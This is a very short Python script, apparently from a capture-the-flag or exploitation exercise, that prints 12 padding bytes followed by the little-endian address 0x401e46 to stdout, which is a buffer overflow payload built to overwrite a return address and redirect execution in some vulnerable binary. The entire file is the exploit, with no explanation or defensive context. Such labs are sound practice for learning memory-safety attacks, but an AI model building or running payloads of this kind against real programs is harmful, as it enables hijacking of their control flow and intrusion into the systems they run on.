#!/usr/bin/env python3

import sys

address = 0x0000000000401e46
sys.stdout.buffer.write(b"A" * 12 + address.to_bytes(8, 'little'))
